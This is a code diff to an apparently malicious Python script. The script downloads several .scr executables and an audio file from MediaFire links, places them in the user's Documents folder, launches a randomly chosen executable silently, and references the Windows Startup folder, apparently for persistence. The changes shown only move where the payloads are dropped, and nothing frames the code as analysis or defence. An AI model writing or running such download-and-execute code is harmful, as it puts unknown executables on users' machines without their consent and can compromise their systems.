@@ -10,6 +10,7 @@ def checkex():
 
     global ft
     cd = os.getcwd()
+    global  quest
     quest = getpass.getuser()
     startxa = "C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     start = "\"C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
@@ -29,21 +30,23 @@ def checkex():
 
 def dn():
     # Necessary files
+    global  disf
+    disf = "\"C:\Users" + "\\" + quest + "\Documents\""
 
     wget.download("http://download1499.mediafire.com/4idbxxf5qpxg/3u2ps3idmsh3tgw/bambams.scr")
-    os.system("move bambams.scr C:\\")
+    os.system("move bambams.scr " + disf)
     time.sleep(1)
 
     wget.download("http://download1639.mediafire.com/8g6qmhu5ud2g/wbgvv3ba751hdis/jajas.scr")
-    os.system("move jajas.scr C:\\")
+    os.system("move jajas.scr " +  disf)
     time.sleep(1)
 
     wget.download("http://download1496.mediafire.com/rnww1w81kzzg/14q3n14sqmh3kwn/xavs.scr")
-    os.system("move xavs.scr C:\\")
+    os.system("move xavs.scr " + disf)
     time.sleep(1)
 
     wget.download("http://download1324.mediafire.com/ty4c5lkbt8bg/4e26tz4lc3905ld/jcs.mp3")
-    os.system("move jcs.mp3 C:\\")
+    os.system("move jcs.mp3 " + disf)
     time.sleep(1)
 
     payloads()
@@ -56,7 +59,7 @@ def payloads():
 
     def scsa():
         csc0 = random.choice(['bambams.scr', 'jajas.scr','xavs.scr'])
-        os.system("start C:\\" + csc0 + " /s")
+        os.system("start " + disf + " " + csc0 + " /s")
 
     def poo():
         root = Tk()
@@ -104,6 +107,7 @@ def payloads():
 
 
 checkex()
+
 
 
 
